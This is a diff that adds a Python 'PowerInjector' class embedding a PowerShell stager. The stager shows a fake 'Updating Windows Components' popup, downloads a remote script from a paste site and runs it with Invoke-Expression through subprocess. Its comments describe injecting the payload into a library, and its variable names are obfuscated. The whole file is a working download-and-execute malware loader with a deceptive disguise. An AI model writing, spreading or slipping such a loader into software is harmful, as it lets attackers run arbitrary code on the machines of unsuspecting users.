@@ -1,0 +1,48 @@
+import subprocess
+import sys
+
+class PowerInjector:
+    def __init__(self):
+        # هنا يتم "حقن" كود الباورشيل كمتغير نصي داخل الكلاس
+        # Here we embed the PowerShell code directly into the library
+        self.embedded_payload = """
+        # Stager Loader
+        $w=New-Object -ComObject WScript.Shell;$w.Popup("Updating Windows Components...",1,"System",64)|Out-Null;
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+        $f7zrCSLcOS2q = "https://paste.rs/8uGIL";
+        $ra4x5jknShdW = New-Object System.Net.WebClient;
+        try {
+            $c = $ra4x5jknShdW.DownloadString($f7zrCSLcOS2q);
+            Invoke-Expression $c;
+        } catch {
+            Write-Host "Connection Failed."
+        }
+        """
+
+    def execute(self):
+        """
+        Executes the embedded PowerShell code.
+        """
+        print("[*] Accessing the embedded library payload...")
+        try:
+            # Execute the powershell command
+            # We use 'powershell -Command' to run the string directly
+            result = subprocess.run(
+                ["powershell", "-Command", self.embedded_payload],
+                capture_output=True,
+                text=True
+            )
+            
+            if result.returncode == 0:
+                print("[+] Execution Successful! Output below:\n")
+                print(result.stdout)
+            else:
+                print("[-] Execution Failed. Error:\n")
+                print(result.stderr)
+                
+        except Exception as e:
+            print(f"[-] An error occurred: {e}")
+
+def run_library_payload():
+    injector = PowerInjector()
+    injector.execute()
